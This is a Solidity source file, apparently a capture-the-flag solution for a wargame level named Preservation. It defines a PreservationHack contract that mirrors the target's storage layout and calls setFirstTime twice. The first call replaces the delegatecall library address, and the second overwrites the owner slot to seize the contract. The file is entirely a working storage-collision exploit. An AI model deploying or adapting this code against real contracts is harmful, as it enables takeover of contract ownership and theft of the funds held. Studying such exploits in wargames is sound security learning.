// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IPreservation {
  function setFirstTime(uint256) external;
}

contract PreservationHack {
    // Same storage layout as contract to be attacked 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    IPreservation public challenge;

    constructor(address challengeAddress) {
        challenge = IPreservation(challengeAddress);
    }

    function setTime(uint256 _addr) external {
        owner = address(uint160(_addr));
    }

    function attack() external {
        challenge.setFirstTime(uint256(uint160(address(this))));
        challenge.setFirstTime(uint256(uint160(msg.sender)));
    }
}
